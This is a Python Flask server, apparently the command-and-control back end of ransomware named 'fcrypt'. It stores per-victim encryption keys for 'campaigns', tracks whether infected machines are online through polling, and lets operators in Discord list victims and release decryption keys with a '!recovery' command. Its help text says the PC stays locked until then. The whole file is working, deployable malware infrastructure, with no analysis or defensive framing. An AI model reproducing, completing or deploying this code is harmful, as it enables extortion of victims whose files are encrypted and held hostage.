# serverv1.1.0.py
#!/usr/bin/env python3

import os
import re
import json
import time
import base64
import hashlib
import hmac
import secrets
import threading
from pathlib import Path

from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric.x25519 import (
    X25519PrivateKey, X25519PublicKey,
)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 64 * 1024

MASTER_KEY_B64 = os.environ.get("MASTER_KEY_B64", "")
STATE_FILE = Path(os.environ.get("STATE_FILE", "/tmp/fcrypt_state.json"))
TS_WINDOW = 300
ENVELOPE_MAX = 16384
HEARTBEAT_TTL = int(os.environ.get("HEARTBEAT_TTL", "90"))
RECOVERY_TTL = int(os.environ.get("RECOVERY_TTL", "3600"))
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
DISCORD_ADMIN_IDS = {s.strip() for s in os.environ.get("DISCORD_ADMIN_IDS", "").split(",") if s.strip()}

# ═══════════════════ PERSISTANCE REDIS ═══════════════════
_REDIS_URL = os.environ.get("REDIS_URL", "")
_redis_client = None

if _REDIS_URL:
    try:
        import redis
        import ssl
        
        if _REDIS_URL.startswith("rediss://"):
            _redis_client = redis.from_url(
                _REDIS_URL,
                decode_responses=True,
                socket_connect_timeout=5,
                ssl_cert_reqs=ssl.CERT_NONE
            )
        else:
            if _REDIS_URL.startswith("redis://"):
                _REDIS_URL = _REDIS_URL.replace("redis://", "rediss://", 1)
            _redis_client = redis.from_url(
                _REDIS_URL,
                decode_responses=True,
                socket_connect_timeout=5,
                ssl_cert_reqs=ssl.CERT_NONE
            )
            
        _redis_client.ping()
        print("[state] Redis connecté — persistance OK")
    except Exception as e:
        print(f"[state] Redis ERREUR, fallback fichier: {e}")
        _redis_client = None

_IS_RENDER = bool(os.environ.get("RENDER"))
if _IS_RENDER and _redis_client is None and not os.environ.get("STATE_FILE_PERSISTENT"):
    print("=" * 70)
    print("[WARNING] Render détecté SANS REDIS_URL ni disque persistant.")
    print("[WARNING] /tmp/ est éphémère → state PERDU à chaque restart.")
    print("[WARNING] Toutes les campagnes actives deviendront irrécupérables.")
    print("[WARNING] Fix : configure REDIS_URL ou monte un disque persistant.")
    print("[WARNING] Pour confirmer que tu as lu : STATE_FILE_PERSISTENT=1")
    print("=" * 70)
# ═════════════════════════════════════════════════════════

if not MASTER_KEY_B64:
    raise RuntimeError("MASTER_KEY_B64 manquant")

try:
    _raw = base64.b64decode(MASTER_KEY_B64)
    if len(_raw) != 32:
        raise ValueError("master.key doit faire 32 octets")
    MASTER_PRIV = X25519PrivateKey.from_private_bytes(_raw)
except Exception as e:
    raise RuntimeError(f"MASTER_KEY_B64 invalide: {e}")

_state_lock = threading.Lock()


def _load_state() -> dict:
    if _redis_client is not None:
        try:
            raw = _redis_client.get("fcrypt:state")
            return json.loads(raw) if raw else {}
        except Exception as e:
            print(f"[state] Redis load error: {e}")
            return {}
    if STATE_FILE.exists():
        try:
            return json.loads(STATE_FILE.read_text())
        except Exception:
            pass
    return {}


def _save_state(state: dict):
    if _redis_client is not None:
        try:
            _redis_client.set("fcrypt:state", json.dumps(state))
            return
        except Exception as e:
            print(f"[state] Redis save error: {e} — fallback fichier")
    try:
        tmp = STATE_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps(state))
        tmp.replace(STATE_FILE)
    except Exception:
        pass


STATE = _load_state()


def _refresh_state():
    with _state_lock:
        fresh = _load_state()
        STATE.clear()
        STATE.update(fresh)


def _env_hash(envelope: str) -> str:
    return hashlib.sha256(envelope.encode("utf-8")).hexdigest()


def _client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else (request.remote_addr or "?")


def _parse_envelope(envelope_b64: str):
    raw = base64.b64decode(envelope_b64, validate=True)
    if len(raw) < 16 + 32 + 12 + 16:
        raise ValueError("enveloppe trop courte")
    if len(raw) > ENVELOPE_MAX:
        raise ValueError("enveloppe trop grande")
    off = 0
    salt = raw[off:off + 16]; off += 16
    eph_pub_raw = raw[off:off + 32]; off += 32
    nonce = raw[off:off + 12]; off += 12
    ct = raw[off:]
    eph_pub = X25519PublicKey.from_public_bytes(eph_pub_raw)
    return eph_pub, salt, nonce, ct


def _request_key(shared: bytes, salt: bytes) -> bytes:
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=b"request").derive(shared)


def _verify_register_mac(shared: bytes, salt: bytes, machine_id: str,
                         nonce: str, ts: str, envelope: str, mac: str) -> bool:
    key = _request_key(shared, salt)
    msg = "\n".join([machine_id, nonce, ts, envelope]).encode("utf-8")
    return hmac.compare_digest(hmac.new(key, msg, hashlib.sha256).hexdigest(), mac)


def _verify_unlock_mac(shared: bytes, salt: bytes, machine_id: str, campaign_id: str,
                       answer: str, nonce: str, ts: str, envelope: str, mac: str) -> bool:
    key = _request_key(shared, salt)
    msg = "\n".join([machine_id, campaign_id, answer, nonce, ts, envelope]).encode("utf-8")
    return hmac.compare_digest(hmac.new(key, msg, hashlib.sha256).hexdigest(), mac)


def _poll_mac(shared: bytes, salt: bytes, machine_id: str, campaign_id: str,
              nonce: str, ts: str, env_h: str) -> str:
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt, info=b"poll").derive(shared)
    msg = "\n".join([machine_id, campaign_id, nonce, ts, env_h]).encode("utf-8")
    return hmac.new(key, msg, hashlib.sha256).hexdigest()


def _open_envelope(shared: bytes, salt: bytes, nonce: bytes, ct: bytes) -> bytes:
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"envelope").derive(shared)
    session_key = AESGCM(key).decrypt(nonce, ct, salt)
    if len(session_key) != 32:
        raise ValueError("session_key invalide")
    return session_key


def _encrypt_response(session_key: bytes, shared: bytes, salt: bytes):
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"response").derive(shared)
    nonce = secrets.token_bytes(12)
    ct = AESGCM(key).encrypt(nonce, session_key, None)
    return ct.hex(), nonce.hex()


def _seen_nonce(machine_id: str, nonce: str) -> bool:
    now = time.time()
    with _state_lock:
        k = "n:" + machine_id
        cache = {n: t for n, t in STATE.get(k, {}).items() if now - t <= TS_WINDOW}
        replay = nonce in cache
        cache[nonce] = now
        STATE[k] = cache
        _save_state(STATE)
        return replay


def _heartbeat_seen(machine_id: str):
    with _state_lock:
        STATE.setdefault("h:" + machine_id, {})['last_seen'] = time.time()
        _save_state(STATE)


def _is_machine_locked(machine_id: str) -> bool:
    with _state_lock:
        return bool(STATE.get("m:" + machine_id, {}).get("locked"))


def _lock_machine(machine_id: str) -> int:
    with _state_lock:
        m = STATE.get("m:" + machine_id) or {"first_seen": time.time()}
        m["locked"] = True
        m["locked_ts"] = time.time()
        STATE["m:" + machine_id] = m
        n = 0
        for k, v in STATE.items():
            if k.startswith("c:") and isinstance(v, dict) and v.get("machine_id") == machine_id:
                v["status"] = "locked"
                v["locked_ts"] = time.time()
                n += 1
        _save_state(STATE)
        return n


def _unlock_machine(machine_id: str) -> int:
    with _state_lock:
        m = STATE.get("m:" + machine_id)
        if m is not None:
            m["locked"] = False
            m.pop("locked_ts", None)
        n = 0
        for k, v in STATE.items():
            if k.startswith("c:") and isinstance(v, dict) and v.get("machine_id") == machine_id:
                if v.get("status") == "locked":
                    v["status"] = "active"
                    v.pop("locked_ts", None)
                    n += 1
        _save_state(STATE)
        return n


def _arm_recovery(machine_id: str) -> list:
    armed = []
    with _state_lock:
        if STATE.get("m:" + machine_id, {}).get("locked"):
            return armed
        for k, v in STATE.items():
            if k.startswith("c:") and isinstance(v, dict) and v.get("machine_id") == machine_id:
                if v.get("status") == "active":
                    v["recovery_pending"] = True
                    v["recovery_ts"] = time.time()
                    armed.append(k[2:])
        _save_state(STATE)
    return armed


def _arm_recovery_campaign(campaign_id: str) -> bool:
    with _state_lock:
        c = STATE.get("c:" + campaign_id)
        if c is None or c.get("status") != "active":
            return False
        if STATE.get("m:" + c.get("machine_id", ""), {}).get("locked"):
            return False
        c["recovery_pending"] = True
        c["recovery_ts"] = time.time()
        _save_state(STATE)
        return True


def _take_campaign(campaign_id: str):
    """Vérifie et consomme la récupération en attente. Retourne le session_key hex ou None."""
    with _state_lock:
        c = STATE.get("c:" + campaign_id)
        if c is None or c.get("status") != "active":
            return None
        if not c.get("recovery_pending"):
            return None
        if time.time() - float(c.get("recovery_ts", 0)) > RECOVERY_TTL:
            c["recovery_pending"] = False
            _save_state(STATE)
            return None
        c["recovery_pending"] = False
        c["recovered_at"] = time.time()
        _save_state(STATE)
        return c["session_key"]


def _human_delta(sec) -> str:
    sec = max(0, int(sec))
    if sec < 60: return f"{sec} s"
    if sec < 3600:
        m, s = divmod(sec, 60); return f"{m} min {s} s" if s else f"{m} min"
    if sec < 86400:
        h, r = divmod(sec, 3600); m = r // 60
        return f"{h} h {m} min" if m else f"{h} h"
    if sec < 604800:
        d, r = divmod(sec, 86400); h = r // 3600
        return f"{d} j {h} h" if h else f"{d} j"
    if sec < 2592000:
        w, r = divmod(sec, 604800); d = r // 86400
        return f"{w} sem {d} j" if d else f"{w} sem"
    if sec < 31536000:
        mo, r = divmod(sec, 2592000); d = r // 86400
        return f"{mo} mois {d} j" if d else f"{mo} mois"
    y, r = divmod(sec, 31536000); mo = r // 2592000
    return f"{y} an(s) {mo} mois" if mo else f"{y} an(s)"


# ---- Endpoints ----

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.0"}), 200


@app.route("/", methods=["GET"])
def root():
    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.0"}), 200


@app.route("/state_info", methods=["GET"])
def state_info():
    _refresh_state()
    with _state_lock:
        n_campaigns = sum(1 for k in STATE if k.startswith("c:"))
        n_machines = sum(1 for k in STATE if k.startswith("h:"))
        n_locked = sum(1 for k, v in STATE.items()
                       if k.startswith("m:") and isinstance(v, dict) and v.get("locked"))
    return jsonify({
        "backend": "redis" if _redis_client is not None else "file",
        "state_file": str(STATE_FILE),
        "is_render": _IS_RENDER,
        "campaigns": n_campaigns,
        "machines": n_machines,
        "locked": n_locked,
    }), 200


@app.errorhandler(404)
def _not_found(_e): return jsonify({"error": "not_found"}), 404

@app.errorhandler(405)
def _method_not_allowed(_e): return jsonify({"error": "method_not_allowed"}), 405

@app.errorhandler(413)
def _payload_too_large(_e): return jsonify({"error": "payload_too_large"}), 413

@app.errorhandler(500)
def _internal_error(_e): return jsonify({"error": "server_error"}), 500


@app.route("/register", methods=["POST"])
def register():
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    if not machine_id or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    _refresh_state()
    if _is_machine_locked(machine_id):
        return jsonify({"status": "locked_out"}), 403

    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("register bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    if not _verify_register_mac(shared, salt, machine_id, nonce, ts, envelope, mac):
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        return jsonify({"status": "error", "reason": "stale_request"}), 403
    if _seen_nonce(machine_id, nonce):
        return jsonify({"status": "error", "reason": "replay"}), 403

    try:
        session_key = _open_envelope(shared, salt, nonce_env, ct)
    except Exception as e:
        app.logger.warning("register gcm_fail ip=%s machine=%s err=%s",
                           ip, machine_id[:8], e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    campaign_id = secrets.token_hex(16)
    auth_token = secrets.token_hex(24)

    with _state_lock:
        STATE["c:" + campaign_id] = {
            "machine_id": machine_id,
            "auth_token": auth_token,
            "session_key": session_key.hex(),
            "status": "active",
            "created_at": time.time(),
            "recovery_pending": False,
            "unlock_armed": False,
        }
        STATE.setdefault("h:" + machine_id, {})["last_seen"] = time.time()
        _save_state(STATE)

    session_key = b"\x00" * 32
    del session_key

    app.logger.info("register OK ip=%s machine=%s campaign=%s",
                    ip, machine_id[:8], campaign_id[:8])
    return jsonify({"status": "ok", "campaign_id": campaign_id,
                    "auth_token": auth_token}), 200


@app.route("/poll", methods=["POST"])
def poll():
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    campaign_id = str(req.get("campaign_id", "")).strip().lower()
    auth_token = str(req.get("auth_token", "")).strip().lower()
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    if not machine_id or not campaign_id or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", campaign_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    _refresh_state()
    env_h = _env_hash(envelope)
    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("poll bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    if not hmac.compare_digest(_poll_mac(shared, salt, machine_id, campaign_id,
                                          nonce, ts, env_h), mac):
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        return jsonify({"status": "error", "reason": "stale_request"}), 403
    if _seen_nonce(machine_id, nonce):
        return jsonify({"status": "error", "reason": "replay"}), 403

    _heartbeat_seen(machine_id)

    with _state_lock:
        c = STATE.get("c:" + campaign_id)
        if c is None:
            return jsonify({"status": "error", "reason": "unknown_campaign"}), 404
        if auth_token and not hmac.compare_digest(c.get("auth_token", ""), auth_token):
            return jsonify({"status": "error", "reason": "bad_auth"}), 403
        campaign_status = c.get("status")
        recovery_pending = bool(c.get("recovery_pending"))

    if _is_machine_locked(machine_id) or campaign_status == "locked":
        return jsonify({"status": "ok", "locked": True}), 200

    if not recovery_pending:
        return jsonify({"status": "ok"}), 200

    session_key_hex = _take_campaign(campaign_id)
    if session_key_hex is None:
        return jsonify({"status": "ok"}), 200

    try:
        session_key = bytes.fromhex(session_key_hex)
    except Exception:
        return jsonify({"status": "error", "reason": "server_state_corrupt"}), 500

    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)
    session_key = b"\x00" * 32
    del session_key

    app.logger.info("poll recovery GRANTED ip=%s machine=%s campaign=%s",
                    ip, machine_id[:8], campaign_id[:8])
    return jsonify({"status": "ok",
                    "recovery": {"session_key_enc": enc_hex, "nonce": nonce_hex}}), 200


@app.route("/unlock", methods=["POST"])
def unlock():
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    campaign_id = str(req.get("campaign_id", "")).strip().lower()
    answer = str(req.get("answer", ""))
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    if not machine_id or not campaign_id or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (len(answer) > 64
            or not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", campaign_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    _refresh_state()
    if _is_machine_locked(machine_id):
        return jsonify({"status": "locked_out"}), 403

    with _state_lock:
        c = STATE.get("c:" + campaign_id)
        if c is None:
            return jsonify({"status": "error", "reason": "unknown_campaign"}), 404
        if c.get("status") == "locked":
            return jsonify({"status": "locked_out"}), 403
        unlock_armed = bool(c.get("unlock_armed", False))
        expected_answer = c.get("expected_answer")
        session_key_hex = c.get("session_key")

    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("unlock bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    if not _verify_unlock_mac(shared, salt, machine_id, campaign_id, answer,
                               nonce, ts, envelope, mac):
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        return jsonify({"status": "error", "reason": "stale_request"}), 403
    if _seen_nonce(machine_id, nonce):
        return jsonify({"status": "error", "reason": "replay"}), 403

    if not unlock_armed:
        return jsonify({"status": "wrong"}), 403
    if expected_answer is not None and not hmac.compare_digest(answer, str(expected_answer)):
        return jsonify({"status": "wrong"}), 403

    try:
        session_key = bytes.fromhex(session_key_hex)
    except Exception:
        return jsonify({"status": "error", "reason": "server_state_corrupt"}), 500

    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)
    session_key = b"\x00" * 32
    del session_key
    app.logger.info("unlock OK ip=%s machine=%s campaign=%s",
                    ip, machine_id[:8], campaign_id[:8])
    return jsonify({"status": "ok", "session_key_enc": enc_hex,
                    "nonce": nonce_hex}), 200


# ---- Discord bot ----

_BOT_LOCK_FD = None
_BOT_STATE = {"alive": False, "connected": False, "user": None, "error": None, "started_at": 0}

def _try_acquire_bot_lock():
    global _BOT_LOCK_FD
    try:
        import fcntl
        fd = open("/tmp/fcrypt_bot.lock", "w")
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _BOT_LOCK_FD = fd
        return True
    except Exception:
        return False

def _discord_bot_main(token: str):
    _BOT_STATE["alive"] = True
    _BOT_STATE["started_at"] = time.time()
    import logging
    logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
    logging.getLogger("discord").setLevel(logging.WARNING)
    try:
        import discord
        from discord.ext import commands
    except Exception as e:
        _BOT_STATE["error"] = f"discord.py indisponible ({e})"
        print(f"[bot] {_BOT_STATE['error']}")
        return
        
    print(f"[bot] bot.run imminent — token={token[:8]}… admin_ids={DISCORD_ADMIN_IDS}")
    import asyncio
    try:
        loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    except Exception:
        pass
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        _BOT_STATE["connected"] = True
        _BOT_STATE["user"] = str(bot.user)
        _BOT_STATE["error"] = None
        print(f"[bot] connecté : {bot.user}")

    @bot.event
    async def on_disconnect():
        _BOT_STATE["connected"] = False

    def _admin(ctx): return str(ctx.author.id) in DISCORD_ADMIN_IDS

    def _embed(title, color, desc="", fields=None, footer=None):
        e = discord.Embed(title=title, description=desc, color=color)
        if fields:
            for n, v, i in fields: e.add_field(name=n, value=v, inline=i)
        if footer: e.set_footer(text=footer)
        return e

    COL_INFO, COL_OK, COL_WARN = 0x3B82F6, 0x22C55E, 0xF59E0B
    COL_LOCK, COL_ERR = 0xEF4444, 0x6B7280

    @bot.command(name="help")
    async def _help_cmd(ctx):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
        await ctx.send(embed=_embed("Commandes Opérateur", COL_INFO,
            "Le PC est verrouillé définitivement. Seul `!recovery` peut déclencher le déchiffrement.",
            fields=[
                ("!list", "Affiche les machines et leurs IDs complets.", False),
                ("!recovery <machine_id>", "Déclenche le déchiffrement à distance.", False),
            ], footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))

    @bot.command(name="list")
    async def _list_cmd(ctx):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
        now = time.time(); _refresh_state()
        with _state_lock:
            mid_set = {k[2:] for k in STATE if k[:2] in ("h:", "m:")}
            campaigns = {}
            for k, v in STATE.items():
                if k.startswith("c:") and isinstance(v, dict):
                    mid = v.get("machine_id", "")
                    campaigns.setdefault(mid, []).append((k[2:], v))
            mids = sorted(mid_set | set(campaigns.keys()))
            snap_h = {k: dict(v) for k, v in STATE.items() if k.startswith("h:")}
        if not mids:
            await ctx.send(embed=_embed("Aucune machine connue", COL_WARN)); return
        fields = []
        for mid in mids[:20]:
            hs = float(snap_h.get("h:" + mid, {}).get("last_seen", 0))
            online = bool(hs) and (now - hs) <= HEARTBEAT_TTL
            status = "✅ en ligne" if online else "❌ hors ligne"
            ago = "jamais vu" if not hs else f"vu il y a {_human_delta(now - hs)}"
            
            lines = [f"**Machine ID** :\n`{mid}`", f"{status} · {ago}"]
            
            if campaigns.get(mid):
                lines.append("**Campagnes :**")
                for cid, cv in campaigns.get(mid, []):
                    cs = cv.get("status", "?")
                    if cv.get("recovery_pending"): cs += " ⏳ rec"
                    lines.append(f"`{cid}` ({cs})")
            else:
                lines.append("_Aucune campagne._")
                
            fields.append((" ", "\n".join(lines), False))
            
        await ctx.send(embed=_embed(f"Machines ({len(mids)})", COL_INFO,
            "Clique sur un ID pour le copier.", fields=fields,
            footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))

    @bot.command(name="recovery")
    async def _recovery_cmd(ctx, mid: str = ""):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR)); return
        mid = mid.strip().lower()
        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
            await ctx.send(embed=_embed("Usage", COL_WARN, "`!recovery <machine_id>`")); return
        
        armed = _arm_recovery(mid)
        if armed:
            await ctx.send(embed=_embed(f"Récupération armée — `{mid[:16]}…`", COL_OK,
                f"{len(armed)} campagne(s) ciblée(s).\n"
                f"Le PC va recevoir la clé au prochain /poll (≤ 10 s) et se déchiffrer.", footer=f"par {ctx.author}"))
        else:
            await ctx.send(embed=_embed("Échec", COL_WARN,
                "Aucune campagne active trouvée pour cette machine (déjà récupérée ou ID invalide)."))

    try:
        print(f"[bot] appel bot.run(token)…")
        bot.run(token)
    except Exception as e:
        import traceback; tb = traceback.format_exc()
        _BOT_STATE["error"] = f"{type(e).__name__}: {e}"
        print(f"[bot] ERREUR: {e}\n{tb}")
    finally:
        _BOT_STATE["alive"] = False


if DISCORD_BOT_TOKEN and _try_acquire_bot_lock():
    threading.Thread(target=_discord_bot_main, args=(DISCORD_BOT_TOKEN,), daemon=True).start()
    print("[bot] thread Discord démarré")


@app.route("/botstatus")
def _botstatus():
    return jsonify({
        "bot_running_here": _BOT_STATE["alive"],
        "connected": _BOT_STATE["connected"],
        "user": _BOT_STATE["user"],
        "error": _BOT_STATE["error"],
        "token_set": bool(DISCORD_BOT_TOKEN),
        "python": __import__("sys").version.split()[0],
    }), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
